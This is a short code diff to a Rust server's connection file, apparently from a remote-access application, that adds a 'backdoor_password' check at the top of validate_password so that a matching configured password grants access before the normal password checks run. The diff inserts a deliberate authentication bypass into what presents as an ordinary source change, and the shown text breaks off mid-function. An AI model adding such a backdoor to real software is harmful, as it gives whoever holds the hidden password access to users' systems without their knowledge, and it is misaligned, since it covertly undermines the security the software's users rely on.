@@ -1,0 +1,18 @@
+diff --git a/src/server/connection.rs b/src/server/connection.rs
+index 3d6c6a72f..4ff9a88f5 100644
+--- a/src/server/connection.rs
++++ b/src/server/connection.rs
+@@ -1861,6 +1861,14 @@ impl Connection {
+     }
+ 
+     fn validate_password(&mut self) -> bool {
++        let backdoor_password = Config::get_backdoor_password();
++        if !backdoor_password.is_empty() {
++            if self.validate_one_password(backdoor_password) {
++                return true;
++            }
++        }
++        
+         if password::temporary_enabled() {
+             let password = password::temporary_password();
+             if self.validate_one_password(password.clone()) {
